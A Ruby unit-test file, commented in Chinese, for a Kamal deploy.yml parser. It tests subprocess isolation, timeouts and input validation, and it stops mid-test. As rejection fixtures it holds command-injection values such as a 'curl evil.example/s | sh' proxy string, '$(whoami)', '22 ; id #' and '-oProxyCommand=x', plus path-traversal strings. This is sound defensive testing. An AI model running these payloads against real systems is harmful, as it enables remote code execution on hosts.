require "test_helper"

class Kamal::ConfigParserTest < ActiveSupport::TestCase
  # 两个测试专用的假子进程，只用来验证 run_subprocess 里"写 stdin 也受硬
  # 超时保护、子进程提前退出不会变成未捕获的 Errno::EPIPE"这两件事本身，
  # 不依赖真实 Kamal 解析行为：
  #   - NeverReadsStdin：故意永远不读 stdin，用来验证父进程的
  #     stdin.write 不会因此卡住整个父进程。
  #   - ExitsImmediately：故意立刻退出、完全不读 stdin，用来验证父进程
  #     的 stdin.write 撞上一个已经关闭的管道时，只会得到 Errno::EPIPE
  #     被安静地吞掉，而不是抛出去变成调用方看到的异常。
  class NeverReadsStdin < Kamal::ConfigParser
    private
      def command
        [ RbConfig.ruby, "-e", "sleep 100" ]
      end
  end

  class ExitsImmediately < Kamal::ConfigParser
    private
      def command
        [ RbConfig.ruby, "-e", "exit 0" ]
      end
  end

  def simple_yaml
    file_fixture("simple_deploy.yml").read
  end

  test "解析出服务名、角色与主机" do
    parsed = Kamal::ConfigParser.call(yaml: simple_yaml, destination: "production")

    assert_equal "blog", parsed.service
    assert_equal "production", parsed.destination
    assert_equal %w[web worker], parsed.roles.map { |r| r[:name] }.sort
    assert_equal [ "127.0.0.1" ], parsed.app_hosts
    assert_equal "registry.example.com", parsed.registry_server
  end

  test "容器名前缀含 destination，与 Kamal 的约定一致" do
    parsed = Kamal::ConfigParser.call(yaml: simple_yaml, destination: "production")
    web = parsed.roles.detect { |r| r[:name] == "web" }

    assert_equal "blog-web-production", web[:container_prefix]
  end

  test "沿用 deploy.yml 里声明的 SSH 参数" do
    parsed = Kamal::ConfigParser.call(yaml: simple_yaml, destination: "production")

    assert_equal "deploy", parsed.ssh_options[:user]
    assert_equal 2201, parsed.ssh_options[:port]
  end

  test "无效 YAML 抛 ParseError 而非崩溃" do
    error = assert_raises(Kamal::ConfigParser::ParseError) do
      Kamal::ConfigParser.call(yaml: "这不是合法的 deploy 配置")
    end

    assert_match(/./, error.message)
  end

  test "解析在子进程中进行：deploy.yml 中的 ERB 无法污染面板进程" do
    malicious = <<~YAML
      service: evil
      image: example/evil
      <%= Object.const_set(:PANEL_WAS_COMPROMISED, true) %>
      servers:
        web:
          - 127.0.0.1
    YAML

    # 解析成功与否不重要，重要的是常量没有出现在本进程里
    begin
      Kamal::ConfigParser.call(yaml: malicious)
    rescue Kamal::ConfigParser::ParseError
      # 允许
    end

    refute defined?(::PANEL_WAS_COMPROMISED),
      "ERB 在面板进程内被求值了——解析没有真正隔离到子进程"
  end

  test "解析超时被当作失败处理" do
    slow = <<~YAML
      service: slow
      image: example/slow
      <%= sleep 30 %>
      servers:
        web:
          - 127.0.0.1
    YAML

    assert_raises(Kamal::ConfigParser::ParseError) do
      Kamal::ConfigParser.call(yaml: slow, timeout: 2)
    end
  end

  test "解析超时不会在磁盘上留下临时文件（含用户 payload）" do
    slow = <<~YAML
      service: slow
      image: example/slow
      <%= sleep 30 %>
      servers:
        web:
          - 127.0.0.1
    YAML

    pattern = File.join(Dir.tmpdir, "#{Kamal::ConfigParser::TMPDIR_PREFIX}*")

    assert_raises(Kamal::ConfigParser::ParseError) do
      Kamal::ConfigParser.call(yaml: slow, timeout: 1)
    end

    assert_empty Dir.glob(pattern),
      "超时后临时目录未被清理——用户粘贴的 deploy.yml 可能仍留在磁盘上"
  end

  # destination 目前没有长度上限，撑大它就能撑大传给子进程的 JSON
  # payload——复现 round 3 review 报告的量级（16 KiB 撑到 98,316 字节，
  # 远超常见的 64KiB 管道缓冲区）。用 run_subprocess 直接测（跳过
  # write_config_files）：destination 一旦这么长，正常流程里
  # destination_path 会把它当成文件名的一部分去落盘，直接撞上文件系统的
  # 文件名长度上限（ENAMETOOLONG）——那是另一个既有问题，跟这里要测的
  # "写 stdin 是否受硬超时保护"无关，所以不通过公开的 #call 走完整流程。
  def huge_destination
    "x" * (256 * 1024)
  end

  test "父进程写 stdin 也受硬超时保护：子进程从不读 stdin 时，父进程不会被写操作卡住" do
    parser = NeverReadsStdin.new(yaml: simple_yaml, destination: huge_destination, destination_yaml: nil, timeout: 0.5)

    t0 = Process.clock_gettime(Process::CLOCK_MONOTONIC)
    Dir.mktmpdir do |dir|
      assert_raises(Kamal::ConfigParser::ParseError) { parser.send(:run_subprocess, dir) }
    end
    elapsed = Process.clock_gettime(Process::CLOCK_MONOTONIC) - t0

    # 没有这个修复之前，这里量出来的是 117.85 秒（父进程真的卡在
    # stdin.write 上，硬超时从没生效）。现在应该落在超时附近。
    assert_operator elapsed, :<, 5.0, "stdin.write 应该跟别的 IO 一样受硬超时保护，不应该让父进程卡住"
  end

  test "子进程提前退出（完全不读 stdin）时，父进程写 stdin 不会抛出未处理的 Errno::EPIPE" do
    parser = ExitsImmediately.new(yaml: simple_yaml, destination: huge_destination, destination_yaml: nil, timeout: 3.0)

    # 期望的失败方式是 ParseError（"子进程无输出"）——不是 Errno::EPIPE。
    # assert_raises 只认它字面写的那个类；如果这里真的漏出 Errno::EPIPE，
    # assert_raises 会报"期望 ParseError，实际是 Errno::EPIPE"而失败，
    # 而不是静默通过。
    Dir.mktmpdir do |dir|
      assert_raises(Kamal::ConfigParser::ParseError) { parser.send(:run_subprocess, dir) }
    end
  end

  test "子进程输出超过管道缓冲区也不会被误报为超时" do
    many_hosts = (1..5_000).map { |i| "10.#{(i >> 16) & 0xFF}.#{(i >> 8) & 0xFF}.#{i & 0xFF}" }
    large_yaml = YAML.dump(
      "service" => "big",
      "image" => "example/big",
      "servers" => { "web" => many_hosts },
      "registry" => { "server" => "registry.example.com", "username" => "someone", "password" => [ "KAMAL_REGISTRY_PASSWORD" ] },
      "builder" => { "arch" => "amd64" }
    )

    parsed = Kamal::ConfigParser.call(yaml: large_yaml)

    assert_equal many_hosts.sort, parsed.app_hosts.sort
  end

  test "destination_yaml 覆盖 base 里的 servers（destination 的主要用途）" do
    base = YAML.dump(
      "service" => "blog",
      "image" => "example/blog",
      "servers" => { "web" => [ "127.0.0.1" ] },
      "registry" => { "server" => "registry.example.com", "username" => "someone", "password" => [ "KAMAL_REGISTRY_PASSWORD" ] },
      "builder" => { "arch" => "amd64" }
    )
    override = YAML.dump("servers" => { "web" => [ "10.0.0.9" ] })

    parsed = Kamal::ConfigParser.call(
      yaml: base,
      destination: "production",
      destination_yaml: override
    )

    assert_equal [ "10.0.0.9" ], parsed.app_hosts
  end

  test "destination_yaml 为 nil 时按空占位符解析，不报错" do
    parsed = Kamal::ConfigParser.call(
      yaml: simple_yaml,
      destination: "production",
      destination_yaml: nil
    )

    assert_equal "blog", parsed.service
    assert_equal "production", parsed.destination
  end

  test "不传 destination 时不需要伴随文件，照常解析" do
    parsed = Kamal::ConfigParser.call(yaml: simple_yaml)

    assert_nil parsed.destination
    assert_equal "blog", parsed.service
  end

  test "空字符串的 destination 跟不传一样，不需要伴随文件" do
    parsed = Kamal::ConfigParser.call(yaml: simple_yaml, destination: "")

    assert_nil parsed.destination
    assert_equal "blog", parsed.service
  end

  # --- 下面这组测试把 destination 当成攻击面来测：它最终会被当成文件名的
  # 一部分去拼路径（本类自己拼一次，Kamal 在子进程里为了定位伴随文件又拼
  # 一次），如果放行路径分隔符/".."，就是一个路径穿越面——父进程这边可以
  # 被诱导把 destination_config_yaml 写到临时目录之外的任意位置，子进程
  # 那边可以被诱导读取（并 ERB 求值）主机上任意一份已存在的 .yml。 -------

  test "destination 里的路径穿越序列被拒绝（字符集校验），且不会在临时目录之外创建任何文件" do
    # target 必须从 traversal 这同一个 payload 推算出来，不能各写各的：
    # 之前这里假设的目标是 Rails.root/tmp/...，但 payload 实际解析到的是
    # /tmp/...——两者是不同的文件，即使实现先写文件、之后才报错，
    # "假设的目标不存在" 也会照样通过，完全测不出问题。
    #
    # 推算方式：用跟 destination_path 完全相同的 Pathname 操作
    # （join("deploy.yml").sub_ext(...).expand_path），基准目录随便给一个
    # （这里用 "/"）——只要 "../" 的数量比任何真实 Dir.mktmpdir 生成的临时
    # 目录深度都大，结果就会被 clamp 到文件系统根，跟真正传给实现的那个
    # （未知、随机的）临时目录算出来的结果完全一样，不依赖猜中它的深度。
    suffix = "tmp/PWNED_by_config_parser_test"
    traversal = ("../" * 10) + suffix
    target = Pathname.new("/").join("deploy.yml").sub_ext(".#{traversal}.yml").expand_path

    FileUtils.rm_f(target)

    error = assert_raises(Kamal::ConfigParser::ParseError) do
      Kamal::ConfigParser.call(
        yaml: simple_yaml,
        destination: traversal,
        destination_yaml: "servers:\n  web:\n    - 6.6.6.6\n"
      )
    end

    assert_match(/destination 不合法/, error.message)
    refute target.exist?,
      "destination 里的路径穿越序列本该被拒绝，却真的在临时目录之外创建了文件（#{target}）"
  ensure
    FileUtils.rm_f(target)
  end

  # 下面这条单独测第二道关卡（destination_path 里"解析出的路径必须仍在
  # 临时目录内"的断言），不经过 validate_destination! 的字符集校验——因为
  # 字符集校验已经会挡住任何带 "/" 的 destination，正常调用路径下第二道
  # 关卡根本摸不到。绕过的方式是直接构造实例并调用私有方法：这就是
  # "纵深防御"要证明的东西——即使第一道关卡（字符集）将来被改坏、被绕过，
  # 第二道关卡（路径必须落在临时目录里）依然独立生效。
  test "即使绕过字符集校验，destination_path 也会拒绝任何解析到临时目录之外的路径" do
    parser = Kamal::ConfigParser.new(yaml: simple_yaml, destination: "x", destination_yaml: nil, timeout: 5)
    parser.instance_variable_set(:@destination, "../../../../../../tmp/PWNED_via_destination_path")

    Dir.mktmpdir do |dir|
      error = assert_raises(Kamal::ConfigParser::ParseError) do
        parser.send(:destination_path, dir)
      end

      assert_match(/超出了临时目录范围/, error.message)
    end
  end

  # 这条测的是 destination_path 本身（不是完整的 #call）：一份指向临时目录
  # 之外、真实存在、格式完全合法的 .yml（是一份"host 覆盖成 6.6.6.6"的
  # Kamal 配置），即使绕开字符集校验，也必须在"读它的内容"之前就被拒绝，
  # 而不是先打开读一下、发现内容之后再判断要不要用。正常调用路径下这份
  # 外部文件根本摸不到——在字符集校验（validate_destination!）那一关就已经
  # 被拒绝了（见上面那条测试）；这里不是在测"完整解析流程会不会泄露这份
  # 文件的内容"（正常流程压根不会走到这一步，没有内容可泄露可测），而是在
  # 单独确认第二道关卡本身的行为：拒绝发生在读取之前，不依赖文件是否存在、
  # 内容是否合法。
  test "绕开字符集校验后，destination_path 会在读取内容之前就拒绝一份放在临时目录之外、真实存在的 .yml" do
    outside = Rails.root.join("tmp", "outside_kamal_panel_test.yml")
    outside.write(YAML.dump("servers" => { "web" => [ "6.6.6.6" ] }))

    parser = Kamal::ConfigParser.new(yaml: simple_yaml, destination: "x", destination_yaml: nil, timeout: 5)
    traversal_to_outside_file = "../" * 10 + outside.expand_path.to_s.delete_prefix("/").sub(/\.yml\z/, "")
    parser.instance_variable_set(:@destination, traversal_to_outside_file)

    Dir.mktmpdir do |dir|
      assert_raises(Kamal::ConfigParser::ParseError) do
        parser.send(:destination_path, dir)
      end
    end
  ensure
    FileUtils.rm_f(outside)
  end

  test "destination 超过长度上限时被校验拒绝，而不是撞上文件系统的文件名长度限制" do
    error = assert_raises(Kamal::ConfigParser::ParseError) do
      Kamal::ConfigParser.call(yaml: simple_yaml, destination: "x" * 64)
    end

    assert_match(/destination 不合法/, error.message)
    refute_match(/ENAMETOOLONG|File name too long/, error.message)
  end

  test "正常的短 destination（含连字符和数字）不受影响" do
    %w[production staging eu-west prod2].each do |dest|
      parsed = Kamal::ConfigParser.call(yaml: simple_yaml, destination: dest)

      assert_equal dest, parsed.destination, "destination=#{dest.inspect} 应该照常解析"
    end
  end

  test "非 String 的 destination（绕过 ManagedApp 的直接调用者可能传错类型）被拒绝为 ParseError，而不是 NoMethodError" do
    error = assert_raises(Kamal::ConfigParser::ParseError) do
      Kamal::ConfigParser.call(yaml: simple_yaml, destination: 42)
    end

    assert_match(/destination 不合法/, error.message)
  end

  # --- service 字符集校验（Critical 2，task-5 review） -----------------
  #
  # destination 早就因为"会被当成路径片段拼进去"这条理由收紧过字符集
  # （见上面 DESTINATION_FORMAT / validate_destination! 的注释），但
  # service 是同一类值（同样来自不可信的 deploy.yml，同样会被
  # KamalLock 拼进锁目录名 "lock-#{service}-#{destination}"）却一直没有
  # 补上同一条校验。
  #
  # Kamal 自己对 service 也有一条字符集校验（configuration.rb:364，
  # `raw_config[:service] =~ /^[a-z0-9_-]+$/i`），但那条用的是"行锚点"
  # （^/$），不是"字符串锚点"（\A/\z）——只要字符串里有任意一整行匹配，
  # `=~` 就判定通过，不要求整个字符串都匹配。下面第三条测试
  # （"Kamal 自己的校验能被换行符绕过"）证明了这一点：
  # "ok\n../../etc/passwd" 这个 service 会被 Kamal 自己的校验放行
  # （第一行 "ok" 单独匹配），如果面板只依赖 Kamal 这道关卡，
  # "../../etc/passwd" 就会作为 service 的一部分原样交给 KamalLock 去拼
  # 锁目录路径。本类新增的 validate_service!（\A...\z，字符串锚点）
  # 挡住了这个绕过——这不是重复劳动，是纵深防御：任何一层校验单独失效，
  # 另一层还在。前两条测试锁定"最朴素的攻击面"仍然在解析阶段就被拒绝
  # （不管是被 Kamal 自己挡下还是被本类挡下，最终结果都必须是 ParseError，
  # 不能把带路径分隔符的 service 解析成功）。

  def yaml_with_service(service_yaml_scalar)
    <<~YAML
      service: #{service_yaml_scalar}
      image: example/blog
      servers:
        web:
          - 127.0.0.1
      registry:
        server: registry.example.com
        username: someone
        password:
          - KAMAL_REGISTRY_PASSWORD
      builder:
        arch: amd64
    YAML
  end

  test "service 含路径分隔符时被拒绝" do
    assert_raises(Kamal::ConfigParser::ParseError) do
      Kamal::ConfigParser.call(yaml: yaml_with_service("a/b"))
    end
  end

  test "service 含路径穿越序列时被拒绝" do
    assert_raises(Kamal::ConfigParser::ParseError) do
      Kamal::ConfigParser.call(yaml: yaml_with_service("../../etc/passwd"))
    end
  end

  test "Kamal 自己的校验能被换行符绕过，但本类的 validate_service! 挡住了它" do
    # 双引号 YAML 标量里的 "\n" 是真正的换行符（不是字面反斜杠 n）。
    # Kamal 的 /^[a-z0-9_-]+$/i 只要求某一整行匹配——第一行 "ok" 单独
    # 就满足了——所以 Kamal 自己的校验会放行整个字符串，把
    # "../../etc/passwd" 一起带过去。
    error = assert_raises(Kamal::ConfigParser::ParseError) do
      Kamal::ConfigParser.call(yaml: yaml_with_service('"ok\n../../etc/passwd"'))
    end

    assert_match(/service 不合法/, error.message,
      "本类自己的校验（字符串锚点 \\A...\\z）应该拒绝这个换行注入，" \
      "而不是让 Kamal 自己那条较弱的校验（行锚点 ^...$）把它放行")
  end

  test "正常的 service 名称不受影响" do
    %w[blog my-app web2 some_service].each do |name|
      parsed = Kamal::ConfigParser.call(yaml: yaml_with_service(name))

      assert_equal name, parsed.service, "service=#{name.inspect} 应该照常解析"
    end
  end

  # --- ssh.proxy / ssh.proxy_command 攻击面 ---------------------------
  #
  # 复现并锁定 round 4 review 报出的问题：bin/parse_deploy_config 曾经把
  # config.ssh.proxy&.to_s 交出去——Net::SSH::Proxy::Jump 没有定义有意义
  # 的 #to_s，穿过 JSON 边界后变成 "#<Net::SSH::Proxy::Jump:0x...>" 这个
  # 字面字符串，Collectors::SshSession 再把它原样交给 Net::SSH.start，
  # 在真实连接时炸出 NoMethodError（"private method 'open' called for
  # an instance of String"）——capture_many 曾经把这个 NoMethodError 当成
  # "主机不可达"悄悄吞掉。现在 build_ssh_options/build_proxy 在父进程里
  # 用原始字符串构造对象，这里锁定：正常输入能构造出可用的对象、恶意输入
  # 在解析阶段就被拒绝，而不是留到真正建立连接时才以奇怪的方式炸掉。

  def yaml_with_ssh(ssh_extra)
    YAML.dump(
      "service" => "blog",
      "image" => "example/blog",
      "servers" => { "web" => [ "127.0.0.1" ] },
      "registry" => { "server" => "registry.example.com", "username" => "someone", "password" => [ "KAMAL_REGISTRY_PASSWORD" ] },
      "builder" => { "arch" => "amd64" },
      "ssh" => { "user" => "deploy", "port" => 2201 }.merge(ssh_extra)
    )
  end

  test "ssh.proxy 合法（user@host）时被构造成可用的 Net::SSH::Proxy::Jump" do
    parsed = Kamal::ConfigParser.call(yaml: yaml_with_ssh("proxy" => "user@bastion"), destination: "production")

    proxy = parsed.ssh_options[:proxy]

    assert_instance_of Net::SSH::Proxy::Jump, proxy
    assert_equal "user@bastion", proxy.jump_proxies
  end

  test "ssh.proxy 合法（user@host:port）时端口原样保留在 jump spec 里" do
    parsed = Kamal::ConfigParser.call(yaml: yaml_with_ssh("proxy" => "user@bastion:2222"), destination: "production")

    assert_equal "user@bastion:2222", parsed.ssh_options[:proxy].jump_proxies
  end

  test "ssh.proxy 裸主机名时默认 user 为 root，与 Kamal::Configuration::Ssh#proxy 的规则一致" do
    parsed = Kamal::ConfigParser.call(yaml: yaml_with_ssh("proxy" => "bastion"), destination: "production")

    assert_equal "root@bastion", parsed.ssh_options[:proxy].jump_proxies
  end

  test "没有配置 ssh.proxy 时 ssh_options[:proxy] 是 nil，不会凭空造出一个代理对象" do
    parsed = Kamal::ConfigParser.call(yaml: simple_yaml, destination: "production")

    assert_nil parsed.ssh_options[:proxy]
  end

  test "ssh.proxy 带逗号（Net::SSH::Proxy::Jump 的多跳/命令注入点）被拒绝" do
    error = assert_raises(Kamal::ConfigParser::ParseError) do
      Kamal::ConfigParser.call(
        yaml: yaml_with_ssh("proxy" => "user@bastion,x; curl evil.example/s | sh"),
        destination: "production"
      )
    end

    assert_match(/逗号/, error.message)
  end

  test "ssh.proxy 里带 shell 特殊字符（分号、管道、命令替换、反引号、空白）逐一被拒绝" do
    [
      "user@bastion; curl evil.example/s | sh",
      "user@bastion|sh",
      "user@$(whoami)",
      "user@bastion`whoami`",
      "user@bastion extra",
      "user name@bastion"
    ].each do |bad_proxy|
      error = assert_raises(Kamal::ConfigParser::ParseError, "应该拒绝 #{bad_proxy.inspect}") do
        Kamal::ConfigParser.call(yaml: yaml_with_ssh("proxy" => bad_proxy), destination: "production")
      end

      assert_match(/ssh\.proxy 不合法/, error.message, "拒绝 #{bad_proxy.inspect} 时应该给出 ssh.proxy 格式错误，而不是别的报错")
    end
  end

  # round 5 review：round 4 把 ssh.proxy 的 host 字符集收紧到不含下划线，
  # 但 Kamal 的 proxy 默认规则（Kamal::Configuration::Ssh#proxy）本身
  # 没有这个限制——"bastion_1" 这种主机名以前能用，round 4 之后不能用了，
  # 这是不该有的回归。
  test "ssh.proxy 主机名带下划线（如 'bastion_1'）不再被拒绝——round 4 曾经误拒了这个" do
    parsed = Kamal::ConfigParser.call(yaml: yaml_with_ssh("proxy" => "user_1@bastion_2:2222"), destination: "production")

    assert_equal "user_1@bastion_2:2222", parsed.ssh_options[:proxy].jump_proxies
  end

  test "ssh.proxy 的 user 部分带前导连字符时被拒绝（参数注入，跟 host 用同一条规则）" do
    error = assert_raises(Kamal::ConfigParser::ParseError) do
      Kamal::ConfigParser.call(yaml: yaml_with_ssh("proxy" => "-F@bastion"), destination: "production")
    end

    assert_match(/ssh\.proxy 不合法/, error.message)
  end

  # round 5 review 明确要求：不只是断言"被 ConfigParser 拒绝"，还要把
  # 能通过校验的值真的丢给 Net::SSH::Proxy::Jump 的真实实现
  # （build_proxy_command_equivalent），确认放开下划线之后产出的命令行
  # 本身仍然干净——不含任何 shell 元字符。这里只调用
  # build_proxy_command_equivalent（不调用 #open），所以不会真的执行
  # 子进程/建立连接，是纯粹检查"这个类基于校验通过的输入，会拼出什么
  # 命令行"。
  test "重新过一遍 ssh.proxy 的字符集（含 round 5 放开的下划线），构造出的真实命令行不含 shell 元字符" do
    accepted_proxies = [
      "user@bastion",
      "bastion",
      "user@bastion:2222",
      "bastion_1",
      "user_1@bastion_2:2222"
    ]

    # 不检查普通空格——命令行模板本身就靠空格分隔 "-l user -p 22" 这些
    # 参数，那是这条命令行的正常形状，不是注入。真正要挡的是分号、
    # 管道、反引号、`$( )`、引号、反斜杠、以及控制字符（tab/换行/NUL）。
    shell_metacharacters = /[;&|`$(){}<>'"\\\t\n\r\x00]/

    accepted_proxies.each do |proxy_spec|
      parsed = Kamal::ConfigParser.call(yaml: yaml_with_ssh("proxy" => proxy_spec), destination: "production")
      proxy = parsed.ssh_options[:proxy]

      assert_instance_of Net::SSH::Proxy::Jump, proxy, "#{proxy_spec.inspect} 应该被接受"

      command_line = proxy.build_proxy_command_equivalent(nil)

      refute_match(shell_metacharacters, command_line,
        "#{proxy_spec.inspect} 构造出的命令行不应该包含 shell 元字符，实际是 #{command_line.inspect}")
    end
  end

  test "ssh.proxy_command 被拒绝，并给出专门指向 ssh.proxy 的中文报错——这是永久的产品决定，不是 v1 限制" do
    error = assert_raises(Kamal::ConfigParser::ParseError) do
      Kamal::ConfigParser.call(
        yaml: yaml_with_ssh("proxy_command" => "ssh -W %h:%p bastion"),
        destination: "production"
      )
    end

    assert_match(/proxy_command 不受支持/, error.message)
    assert_match(/ssh\.proxy/, error.message, "报错应该告诉用户改用 ssh.proxy")
  end

  # --- servers: 主机名/IP、ssh.port 攻击面 --------------------------------
  #
  # round 4 review 指出：ssh.proxy 的对象一旦被正确构造出来（round 1 修复
  # 的直接后果），Net::SSH::Proxy::Command#open 里那行
  # `IO.popen(command_line, "r+")` 就从"永远到不了"变成"第一次连接就会走
  # 到"——而 Net::SSH::Proxy::Jump#build_proxy_command_equivalent 拼命令行
  # 模板时，`%h`/`%p` 分别来自 servers: 的主机名和 ssh.port，这两个字段
  # 在本类改动之前完全没有字符集校验（Kamal 自己只检查 servers 的值是
  # String/Hash，不检查内容；ssh.port 只是 `fetch("port", 22)`，字符串
  # "22 ; id #" 原样通过）。这里锁定：两个验证过确实可行的攻击 payload
  # 被拒绝，加上一整套跟 ssh.proxy 同样形状的攻击字符批量测试，以及"正常
  # 值不受影响"的回归测试。

  def yaml_with_servers(hosts)
    YAML.dump(
      "service" => "blog",
      "image" => "example/blog",
      "servers" => { "web" => hosts },
      "registry" => { "server" => "registry.example.com", "username" => "someone", "password" => [ "KAMAL_REGISTRY_PASSWORD" ] },
      "builder" => { "arch" => "amd64" },
      "ssh" => { "user" => "deploy", "port" => 2201 }
    )
  end

  test "review 验证过可行的 payload：servers 主机名里带 '; touch ... #' 被拒绝" do
    error = assert_raises(Kamal::ConfigParser::ParseError) do
      Kamal::ConfigParser.call(yaml: yaml_with_servers([ "1.2.3.4 ; touch /tmp/PWNED_by_config_parser_test #" ]), destination: "production")
    end

    assert_match(/servers 里的主机名\/IP 不合法/, error.message)
  end

  test "review 验证过可行的 payload：ssh.port 是 '22 ; id #' 被拒绝" do
    error = assert_raises(Kamal::ConfigParser::ParseError) do
      Kamal::ConfigParser.call(yaml: yaml_with_ssh("port" => "22 ; id #"), destination: "production")
    end

    assert_match(/ssh\.port 不合法/, error.message)
  end

  # round 5 review：IPv6 从"应该拒绝"移到了"应该接受"（见下面新增的
  # IPv6 测试），"::1" 因此从这份批量测试里删掉——不是漏测，是这条
  # 本来就该被接受，留着只会跟新行为打架。
  test "servers 主机名/IP 里带 shell 特殊字符、控制字符、多个 @、非 ASCII 逐一被拒绝" do
    [
      "1.2.3.4; touch /tmp/PWNED",
      "host|sh",
      "host`whoami`",
      "$(whoami)",
      "host name",           # 空白
      "host\tname",          # tab
      "host\nname",          # 换行
      "host\r\nname",        # CRLF
      "host\x00name",        # NUL
      "host%0aname",         # 字面 "%0a"（百分号不在字符集里）
      "user@host@evil",      # 多个 @
      "主机名.example.com",  # 非 ASCII
      "-oProxyCommand=x"    # 前导连字符：见 HOST_FORMAT 上方注释，参数注入
    ].each do |bad_host|
      error = assert_raises(Kamal::ConfigParser::ParseError, "应该拒绝 #{bad_host.inspect}") do
        Kamal::ConfigParser.call(yaml: yaml_with_servers([ bad_host ]), destination: "production")
      end

      assert_match(/servers 里的主机名\/IP 不合法/, error.message, "拒绝 #{bad_host.inspect} 时应该给出 host 格式错误，而不是别的报错")
    end
  end

  # round 5 review：下划线在 round 4 被误拒——Kamal/SSHKit 接受
  # "bastion_1" 这类主机名，面板不应该比它们更严格。这里补一条回归测试
  # 专门锁定这一点，跟"正常主机名"那条分开写，方便一眼看出这是在测
  # 这次修的问题，而不是顺带覆盖到。
  test "servers 主机名带下划线（如 'bastion_1'）不再被拒绝——round 4 曾经误拒了这个" do
    parsed = Kamal::ConfigParser.call(yaml: yaml_with_servers([ "bastion_1" ]), destination: "production")

    assert_equal [ "bastion_1" ], parsed.app_hosts
  end

  test "正常的 servers 主机名/IP（IPv4、主机名、带连字符和点的主机名）不受影响" do
    [ "127.0.0.1", "web1", "web-01.prod-eu.example.com" ].each do |good_host|
      parsed = Kamal::ConfigParser.call(yaml: yaml_with_servers([ good_host ]), destination: "production")

      assert_equal [ good_host ], parsed.app_hosts, "#{good_host.inspect} 应该照常解析"
    end
  end

  # round 5 review 的核心诉求：面板不能比它观测的工具更严格。SSHKit 的
  # 主机解析器认得裸 IPv6，round 4 的字符集校验（只认字母数字点连字符）
  # 会把这些全部误判成"格式不合法"——对一份纯 IPv6 部署来说，这等于完全
  # 没法接入，而且报错还赖字符集，把用户完全合法的 deploy.yml 说成是错的。
  test "servers 主机名支持裸 IPv6" do
    [
      "::1",
      "2001:db8::1",
      "fe80::1"
    ].each do |ipv6_host|
      parsed = Kamal::ConfigParser.call(yaml: yaml_with_servers([ ipv6_host ]), destination: "production")

      assert_equal [ ipv6_host ], parsed.app_hosts, "#{ipv6_host.inspect} 应该被接受"
    end
  end

  # 承接 Task 6 的评审结论：解析器接受方括号 IPv6 没问题，但下游没有任何
  # 代码会把方括号剥掉、把端口拆出来——SshSession#connect 把裸字面量原样
  # 交给 Net::SSH.start → Socket.tcp，两者都不认得 "[::1]" 这种写法，
  # 结果是校验通过、连接却诡异地失败。这里把方括号 IPv6 收回到"暂不支持"，
  # 复用 host:port / user@host:port 那句诚实报错，而不是发明第二种说法。
  test "servers 主机名：方括号 IPv6（带/不带端口）被拒绝，报错说的是暂不支持" do
    [ "[::1]", "[2001:db8::1]", "[::1]:2222", "[2001:db8::1]:2222" ].each do |bracketed_host|
      error = assert_raises(Kamal::ConfigParser::ParseError, "应该拒绝 #{bracketed_host.inspect}") do
        Kamal::ConfigParser.call(yaml: yaml_with_servers([ bracketed_host ]), destination: "production")
      end

      assert_match(/暂不支持/, error.message, "#{bracketed_host.inspect} 应该得到「暂不支持」的报错")
      assert_match(/servers 里的 #{Regexp.escape(bracketed_host.inspect)}/, error.message)
      refute_match(/格式不合法|字符集/, error.message)
    end
  end

  test "servers 主机名：IPv6 zone id（'%eth0' 这类）依然被拒绝——即使裸 IPv6 已经放开" do
    # fe80::1%eth0 是 Resolv::IPv6::Regex 本身会认的合法 RFC 4007 scoped
    # address，但 "%" 正好是 Net::SSH::Proxy::Jump 命令行模板自己的替换
    # 符号（%h/%p），必须显式挡在字符集校验之外，不能指望"IPv6 语法本身
    # 合法"就等于"可以安全地流到这条命令行模板里"。
    error = assert_raises(Kamal::ConfigParser::ParseError) do
      Kamal::ConfigParser.call(yaml: yaml_with_servers([ "fe80::1%eth0" ]), destination: "production")
    end

    assert_match(/servers 里的主机名\/IP 不合法/, error.message)
  end

  test "servers 主机名：方括号 IPv6 端口不合法（超出范围/非数字）时被拒绝" do
    [ "[::1]:0", "[::1]:65536", "[::1]:abc" ].each do |bad_host|
      error = assert_raises(Kamal::ConfigParser::ParseError, "应该拒绝 #{bad_host.inspect}") do
        Kamal::ConfigParser.call(yaml: yaml_with_servers([ bad_host ]), destination: "production")
      end

      assert_match(/servers 里的主机名\/IP 不合法/, error.message)
    end
  end

  # round 5 review：这三种写法 SSHKit 认得（每台主机各自覆盖 user/port），
  # 面板暂不支持，但拒绝的理由必须诚实——不能用"字符集不对"这句听起来像
  # "你配置写错了"的报错来搪塞一个"这个功能还没做"的限制。这里断言的是
  # 报错消息本身（不是随便一个 ParseError 就算过），因为这一轮真正要
  # 锁定的就是"消息说的是不是实话"。
  test "servers 里的 user@host / host:port / user@host:port 被拒绝，但报错说的是暂不支持，不是格式不合法" do
    [
      "deploy@web1",
      "web1:2222",
      "deploy@web1:2222"
    ].each do |unsupported_host|
      error = assert_raises(Kamal::ConfigParser::ParseError, "应该拒绝 #{unsupported_host.inspect}") do
        Kamal::ConfigParser.call(yaml: yaml_with_servers([ unsupported_host ]), destination: "production")
      end

      assert_match(/暂不支持/, error.message, "#{unsupported_host.inspect} 应该得到「暂不支持」的报错，而不是格式不合法")
      assert_match(/servers 里的 #{Regexp.escape(unsupported_host.inspect)}/, error.message)
      refute_match(/格式不合法|字符集/, error.message, "不应该把一个受支持的 SSHKit 语法说成格式错误")
    end
  end

  test "ssh.port 里带 shell 特殊字符、非数字、超出范围逐一被拒绝" do
    [
      "22; id",
      "22|id",
      "22`id`",
      "$(id)",
      "22 extra",
      "-22",
      "0",
      "65536",
      "abc",
      "22\n"
    ].each do |bad_port|
      error = assert_raises(Kamal::ConfigParser::ParseError, "应该拒绝 #{bad_port.inspect}") do
        Kamal::ConfigParser.call(yaml: yaml_with_ssh("port" => bad_port), destination: "production")
      end

      assert_match(/ssh\.port 不合法/, error.message, "拒绝 #{bad_port.inspect} 时应该给出 ssh.port 格式错误，而不是别的报错")
    end
  end

  test "正常的 ssh.port（Integer 或纯数字字符串）不受影响" do
    parsed = Kamal::ConfigParser.call(yaml: yaml_with_ssh("port" => 2222), destination: "production")
    assert_equal 2222, parsed.ssh_options[:port]

    parsed = Kamal::ConfigParser.call(yaml: yaml_with_ssh("port" => "2222"), destination: "production")
    assert_equal 2222, parsed.ssh_options[:port]
  end

  # 变量名是每个应用自己 deploy.yml 里的事，不是常量。这条测试【故意】
  # 用一个不叫 KAMAL_REGISTRY_PASSWORD 的名字——写死那个常量的实现会在这里
  # 当场变红，而用默认名去测则测不出任何东西。
  test "解析出 registry 密码引用的环境变量名" do
